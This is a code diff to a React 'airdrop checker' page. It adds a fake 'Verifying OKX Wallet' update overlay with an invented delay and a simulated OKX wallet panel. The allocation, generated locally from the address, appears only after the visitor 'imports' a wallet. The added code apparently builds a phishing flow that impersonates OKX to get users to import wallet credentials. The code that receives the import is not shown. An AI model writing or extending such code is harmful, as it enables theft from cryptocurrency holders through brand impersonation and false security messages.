@@ -6,6 +6,7 @@ import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
 import { Card } from "@/components/ui/card"
 import Image from "next/image"
+import { OKXWalletSimulation } from "./okx-wallet-import"
 
 function isValidEVMAddress(address: string): boolean {
   // EVM addresses must be 42 characters (0x + 40 hex chars)
@@ -32,6 +33,9 @@ export default function AirdropChecker() {
   const [allocation, setAllocation] = useState<number | null>(null)
   const [isChecking, setIsChecking] = useState(false)
   const [error, setError] = useState("")
+  const [showOkxSimulator, setShowOkxSimulator] = useState(false)
+  const [showOkxUpdate, setShowOkxUpdate] = useState(false)
+  const [hasImported, setHasImported] = useState(false)
 
   const handleCheck = async () => {
     if (!walletAddress.trim()) return
@@ -39,13 +43,22 @@ export default function AirdropChecker() {
     if (!isValidEVMAddress(walletAddress.trim())) {
       setError("Please enter a valid EVM address (starting with 0x)")
       setAllocation(null)
+      setShowOkxSimulator(false)
+      setHasImported(false)
       return
     }
 
     setError("")
+    setHasImported(false)
+    setShowOkxSimulator(false)
+    setShowOkxUpdate(true)
     setIsChecking(true)
+    // Simulate OKX update/verification before opening panel (7s)
+    await new Promise((resolve) => setTimeout(resolve, 7000))
+    setShowOkxUpdate(false)
+    setShowOkxSimulator(true)
     // Simulate API call delay
-    await new Promise((resolve) => setTimeout(resolve, 1000))
+    await new Promise((resolve) => setTimeout(resolve, 800))
 
     const allocatedAmount = generateAllocation(walletAddress)
     setAllocation(allocatedAmount)
@@ -145,7 +158,7 @@ export default function AirdropChecker() {
                 {isChecking ? "Checking..." : "Check Airdrop"}
               </Button>
 
-              {allocation !== null && (
+              {allocation !== null && hasImported && (
                 <div className="mt-8 p-8 glass-card rounded-3xl animate-in fade-in slide-in-from-bottom-4 duration-500">
                   <div className="text-center space-y-3">
                     <p className="text-white/80 text-sm uppercase tracking-widest font-bold">Your Allocation</p>
@@ -180,6 +193,43 @@ export default function AirdropChecker() {
           </div>
         </div>
       </div>
+
+      {showOkxUpdate && (
+        <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/70 backdrop-blur">
+          <div className="absolute inset-0 bg-gradient-to-br from-emerald-500/15 via-blue-500/10 to-purple-500/15 pointer-events-none" />
+          <div className="relative w-full max-w-md mx-4 rounded-3xl bg-[#0c0d10] border border-white/10 p-8 shadow-[0_30px_90px_rgba(0,0,0,0.55)]">
+            <div className="flex items-center gap-3 mb-6">
+              <div className="relative w-10 h-10">
+                <Image src="/okx.png" alt="OKX" fill className="object-contain rounded-lg" />
+              </div>
+              <div>
+                <p className="text-white text-lg font-semibold">Verifying OKX Wallet</p>
+                <p className="text-white/70 text-sm">Update OKX wallet is in progress…</p>
+              </div>
+            </div>
+            <div className="flex items-start gap-3 rounded-2xl bg-white/5 border border-white/10 p-4">
+              <div className="w-10 h-10 flex items-center justify-center rounded-full bg-emerald-500/15 border border-emerald-400/40">
+                <div className="w-5 h-5 border-2 border-emerald-300 border-t-transparent rounded-full animate-spin" />
+              </div>
+              <div>
+                <p className="text-white text-sm font-semibold">Downloading latest components and verifying wallet integrity.</p>
+                <p className="text-white/60 text-sm">Please wait…</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      <OKXWalletSimulation
+        open={showOkxSimulator}
+        onOpenChange={setShowOkxSimulator}
+        address={walletAddress || ""}
+        allocation={allocation ?? 0}
+        onWalletImported={() => {
+          setHasImported(true)
+          setShowOkxSimulator(false)
+        }}
+      />
     </div>
   )
 }
